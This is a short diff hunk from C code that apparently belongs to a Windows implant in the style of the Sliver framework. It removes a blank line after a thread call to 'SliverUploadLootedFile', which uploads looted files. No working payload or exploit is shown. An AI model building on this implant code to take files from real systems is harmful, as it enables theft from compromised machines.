@@ -304,7 +304,6 @@ CONTINUE:
 	}
 
 	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SliverUploadLootedFile, pSession, 0, &dwThreadID);
-
 	dwNumberOfAttempts = 0;
 	while (TRUE) {
 #ifndef _DEBUG
